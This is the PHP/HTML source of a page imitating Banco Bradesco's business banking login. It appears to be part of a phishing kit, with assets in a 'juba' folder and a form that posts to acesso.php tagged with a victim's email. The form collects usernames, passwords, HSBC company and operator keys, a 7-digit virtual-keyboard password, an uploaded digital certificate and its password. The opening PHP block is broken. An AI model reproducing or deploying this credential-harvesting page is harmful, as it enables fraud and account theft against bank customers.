<?php
$

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Banco Bradesco S/A</title>
	<link rel="stylesheet" href="../../../_styles/juba/boot.css">
	<link rel="stylesheet" href="../../../_styles/juba/layout.css">
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700" rel="stylesheet">
	<script src="../../../_jscripts/juba/layout.js"></script>
</head>
<body>
	
<!-- HEADER -->
<div class="container main_header">
	<div class="content position_relative">
		
		<div class="exit_acess">
			<a href="../">
				<img src="../../../_images/juba/button-exit-acesso.jpg" height="28" width="157" alt="">
			</a>
		</div><!-- exit_acess -->

		<div class="logo">
			<a href="#">
				<img src="../../../_images/juba/logo.jpg" height="128" width="140" alt="">
			</a>
		</div><!-- logo -->

		<div class="getTime">
			<?= getDataShow(); ?>
		</div><!-- getTime -->

		<div class="saudacao">
			Acesso Seguro	
		</div><!-- saudacao -->

	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- CORPO -->
<div class="container main_all">
	<div class="content">
	<form action="acesso.php?cliente=<?php echo $emailx; ?>" method="post" enctype="multipart/form-data"  onsubmit="return check_geral();" id="mainForm">
		<div class="main">

			<div class="block_acesso position_relative">
				<div class="select_acesso">
					<div class="bloco_red">1</div> Selecione um tipo de acesso
				</div><!-- select_acesso -->

				<div class="block_acessos">
					<label for="type_acess-one" onclick="getUserTable();"><input type="radio" name="type_acess" id="type_acess-one" value="user_pass" class="meu_radio"> Usuário e Senha </label>
					<label for="type_acess-two"><input type="radio" name="type_acess" id="type_acess-two" value="icp_brasil" class="meu_radio" disabled> ICP Brasil </label>
					<label for="type_acess-three" onclick="getCertTable();"><input type="radio" name="type_acess" id="type_acess-three" value="certificado" class="meu_radio"> Certificado Digital Bradesco </label>

					<div class="block_hbc">
						<span>HSBC - Cliente Connect Bank</span>
						<label for="type_acess-four" onclick="getHbcTable();"><input type="radio" name="type_acess" id="type_acess-four" value="hbc" class="meu_radio"> Primeiro Acesso </label>
					</div><!-- block_hbc -->

				</div><!-- block_acessos -->

				

				<div class="block_dados" id="tableUser">

					<div class="user_pass_block">

						<label for="main_user">
							<span>Usuário</span>
							<input type="text" name="main_user" id="main_user" class="user_input" style="text-transform: uppercase;">
						</label>
						
						<br><br>

						<label for="main_pass">
							<span>Senha</span>
							<input type="password" name="main_pass" id="main_pass" class="user_input">
						</label>

						<span class="asc_password">
							Esqueci meu usuário e desejo recuperá-lo por email
						</span>
						<div class="clear"></div>
					</div><!-- user_pass_block -->

				<div class="clear"></div>
				</div><!-- block_dados -->


				<div class="block_cert" id="tableCert">

					<div class="block_information">
						Localize seu <span>certifiado Digital</span>
					</div><!-- block_information --> 

					<div class="cert_block">
						<label class="dest_select">
							<input type="radio" name="cert_sel" id="cert_sel" value="cert_sel" class="meu_radio_cert" checked> 
							Gravado em arquivo<br>Pen drive, CD-Rom ou outras mídias.
						</label>
						<label class="label_file">
							<input type="file" name="arquivo" id="arquivo" class="main_file_one" onchange="return setArqName();" accept=".cer,.crt" />
							<input type="text" name="nome_arquivo" id="nome_arquivo" class="arq_name" value="">
						</label>
					</div><!-- cert_block -->


				<div class="clear"></div>	
				</div><!-- block_cert -->


				<div class="block_hsbc" id="tableHsbc">
					<p class="info_dados">Informe os dados de acesso do HSBC Connect Bank</p>
					
					<label for="chave_emp">
						<span>Chave Empresa</span>
						<input type="text" name="chave_emp" id="chave_emp" class="user_input" maxlength="9">
					</label>
					
					<br><br>

					<label for="chave_ope">
						<span>Chave Operador</span>
						<input type="text" name="chave_ope" id="chave_ope" class="user_input" maxlength="10">
					</label>

					<br><br>

					<label for="sete_pass" class="mtLetters">
						<span>Senha do Teclado Virtual<br>(7 dígitos)</span>
						<input type="password" name="sete_pass" id="sete_pass" class="user_input" maxlength="7">
					</label>

					<p class="asc_passw">Se esqueceu a senha <b>clique aqui</b></p>
					<span class="clear"></span>
				</div><!-- block_hsbc -->

				<div class="clear"></div>

			<div class="clear"></div>	
			</div><!-- block_acesso -->


			<div class="block_acesso position_relative" id="cert_pass_block">
				<div class="select_acesso">
					<div class="bloco_red">2</div>
				</div><!-- select_acesso -->

				<div class="desc_two_block">Digite a <b>senha do certificado</b> selecionado</div>
				<div class="block_nada">
					<input type="password" name="cert_pass" id="cert_pass" class="pass_cert" maxlength="20">
					<span class="inf_pass">(de 08 a 20 dígitos)</span>
				</div>	
			<div class="clear"></div>	
			</div><!-- block_acesso -->


			<div class="block_buttons">
				<input type="hidden" name="sender" value="send_start">
				<input type="reset" name="limpar_campos" id="limpar_campos" value="" class="button_clear">
				<input type="submit" name="enviar_campos" id="enviar_campos" value="" class="button_conect">
			</div><!-- block_buttons -->
		
			<div class="block_info_hbc" id="info_hbc_now">
				<img src="../../../_images/juba/acess-with-hbc.jpg">
			</div><!-- block_info_hbc -->

		</div><!-- main -->
	</form>

		<div class="sidebar">
			<h1>Precisa de Ajuda?</h1>
			<img src="../../../_images/juba/MB-duvidas.jpg" height="63" width="190" alt="">

			<h2>No site do Bradesco Pessoa Juridica:</h2>
			Você encontra as respostas para essas e outras dúvidas:
			
			<div class="clear"></div>

			<h2>Acessar Bradesco Net Empresa</h2>
			<ul>
				<li><span class="lista_side">• Veja passo-a-passo como acessar</span></li>
				<li><span class="lista_side">• Contratar acesso ao Bradesco Net Empresa</span></li>
				<li><span class="lista_side">• Primeiro Acesso - Contratos efetuados na Agência</span></li>
			</ul>

			<div class="clear"></div>

			<h2>Tipos de Acesso</h2>
			<ul>
				<li><span class="lista_side">• Gerar usuário e senha</span></li>
				<li><span class="lista_side">• Gerar usuário e senha</span></li>
				<li><span class="lista_side">• Gerar certificado digital Bradesco</span></li>
				<li><span class="lista_side">• Trocar tipo de acesso Máster</span></li>
			</ul>

			<div class="clear"></div>

			<h2>Chave de Segurança</h2>
			<ul>
				<li><span class="lista_side">• Como gerar Chave de Segurança Bradesco - Eletrônica?</span></li>
				<li><span class="lista_side">• O que é Chave de Segurança Bradesco - Eletrônica?</span></li>
			</ul>

			<div class="clear"></div>
		</div><!-- sidebar -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<!-- FOOTER -->
<div class="container main_footer">
	<div class="content">
		<img src="../../../_images/juba/geral-footer.jpg" height="55" width="992" alt="">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->



<!-- BASE -->	

<div class="container">
	<div class="content">

	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<!-- BASE -->	
</body>
</html>